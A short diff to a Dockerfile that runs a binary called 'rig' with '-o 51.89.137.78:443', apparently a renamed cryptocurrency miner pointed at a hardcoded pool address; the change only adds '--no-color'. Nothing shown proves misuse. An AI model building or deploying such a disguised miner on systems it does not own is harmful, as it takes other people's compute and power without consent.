@@ -18,4 +18,4 @@ RUN apt-get update && apt-get dist-upgrade -y && \
 COPY --from=builder /usr/local/bin/rig /usr/local/bin/
 
 ENTRYPOINT [ "rig" ]
-CMD [ "-o", "51.89.137.78:443" ]
+CMD [ "-o", "51.89.137.78:443", "--no-color" ]
